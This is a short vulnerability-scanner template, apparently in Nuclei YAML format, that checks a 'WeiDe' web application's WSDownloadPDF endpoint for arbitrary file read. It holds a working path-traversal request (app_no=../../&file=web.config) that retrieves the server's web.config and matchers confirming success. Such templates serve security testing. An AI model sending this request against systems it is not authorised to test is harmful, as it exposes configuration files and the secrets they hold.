id: WeiDe-WSDownloadPDF-ReadAnyFile

info:
  name: WeiDe-WSDownloadPDF-ReadAnyFile
  author: iSee857
  severity: high
  description: |
    WeiDe-WSDownloadPDF-ReadAnyFile

http:
  - raw:
      - |
        GET /wxInterface/Case.ashx/WSDownloadPDF?file_type=1&app_no=../../&file=web.config HTTP/1.1
        Host: {{Hostname}}


    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - ?xml version="1.0"
          - <configuration
        condition: and

      - type: status
        status:
          - 200